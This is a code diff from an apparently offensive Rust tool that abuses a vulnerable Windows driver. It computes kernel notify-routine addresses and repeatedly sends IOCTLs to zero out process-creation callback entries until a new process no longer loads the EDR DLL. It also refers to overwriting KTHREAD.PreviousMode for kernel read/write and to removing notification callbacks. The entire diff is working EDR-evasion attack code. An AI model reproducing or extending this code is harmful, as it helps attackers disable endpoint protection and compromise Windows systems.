@@ -97,6 +97,10 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             std::process::exit(-1);
         }
     }
+    // Declaring these here as we need the proc one soon.
+    let process_create_notify_base = {(nt_base as u64).wrapping_add(nt_offsets.psp_create_process_notify_routine as u64)};
+    let thread_create_notify_base = {(nt_base as u64).wrapping_add(nt_offsets.psp_create_thread_notify_routine as u64)};
+    let img_load_notify_base = {(nt_base as u64).wrapping_add(nt_offsets.psp_load_image_notify_routine as u64)};
     
 
     // =-=-> Get a handle to the vuln driver. If fails, write the driver and start service.
@@ -128,9 +132,33 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("[+] Got driver handle: {:?}", h_drv);
 
     // =-=-> Check for EDR DLL we may need to unhook things
-    let mut hooked = utils::is_edr_dll_loaded_in_self();
+    let hooked = utils::is_edr_dll_loaded_in_self();
     if hooked {
-        println!("[*] Current process is hooked. Let's disable to enable Modus Previosa.")
+        println!("[*] Current process is hooked. Let's attack it to enable Modus Previosa.");
+        let mut max_cb_entries_to_blindly_clear = 10;
+        while max_cb_entries_to_blindly_clear > 4 {
+            // EDR driver will never be before the 3rd entry
+            println!("[*] Clearing entry #{} of the process creation notification array.", max_cb_entries_to_blindly_clear);
+            let entry = process_create_notify_base + (max_cb_entries_to_blindly_clear * 0x8);
+            unsafe {
+                xp::send_ioctl_to_driver(
+                    h_drv,
+                    entry,
+                    0x8,
+                );
+            }
+
+            if utils::start_proc_and_check_dll() {
+                println!("[*] Still hooked...");
+            } else {
+                println!("[+] New process not hooked! Exiting this process. Rerun the program and you're g2g!");
+                std::process::exit(1);
+            }
+            max_cb_entries_to_blindly_clear -= 1;
+        }
+
+    } else {
+        println!("[+] Current process isn't hooked. Moving along...");
     }
 
     // =-=-> Overwrite KTHREAD.PreviousMode for kernel RW
@@ -159,10 +187,6 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // =-=-> Remove Process Creation Notification callback
     println!("[>] Removing notification callbacks:");
-    let process_create_notify_base = {(nt_base as u64).wrapping_add(nt_offsets.psp_create_process_notify_routine as u64)};
-    let thread_create_notify_base = {(nt_base as u64).wrapping_add(nt_offsets.psp_create_thread_notify_routine as u64)};
-    let img_load_notify_base = {(nt_base as u64).wrapping_add(nt_offsets.psp_load_image_notify_routine as u64)};
-    
     match xp::nerf_cb(process_create_notify_base, "PspCreateProcessNotifyRoutine") {
         Ok(_val) => {},
         Err(e) => eprintln!("[-] Callback nerfing failed: {:?}", e),
